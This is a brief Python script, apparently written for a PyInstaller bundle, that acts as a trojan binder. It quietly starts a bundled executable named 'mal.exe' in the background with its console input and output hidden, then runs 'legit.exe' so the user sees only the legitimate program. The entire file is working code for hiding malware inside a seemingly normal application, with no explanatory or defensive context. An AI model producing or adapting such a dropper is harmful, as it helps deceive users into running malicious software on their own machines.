import os, sys, subprocess

def base_path(path):
    if getattr(sys, 'frozen', None):
        basedir = sys._MEIPASS
    else:
        basedir = os.path.dirname(__file__)
    return os.path.join(basedir, path)

malFile = base_path('mal.exe')
legitFile = base_path('legit.exe')

subprocess.Popen(malFile, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
subprocess.call(legitFile, shell=True)
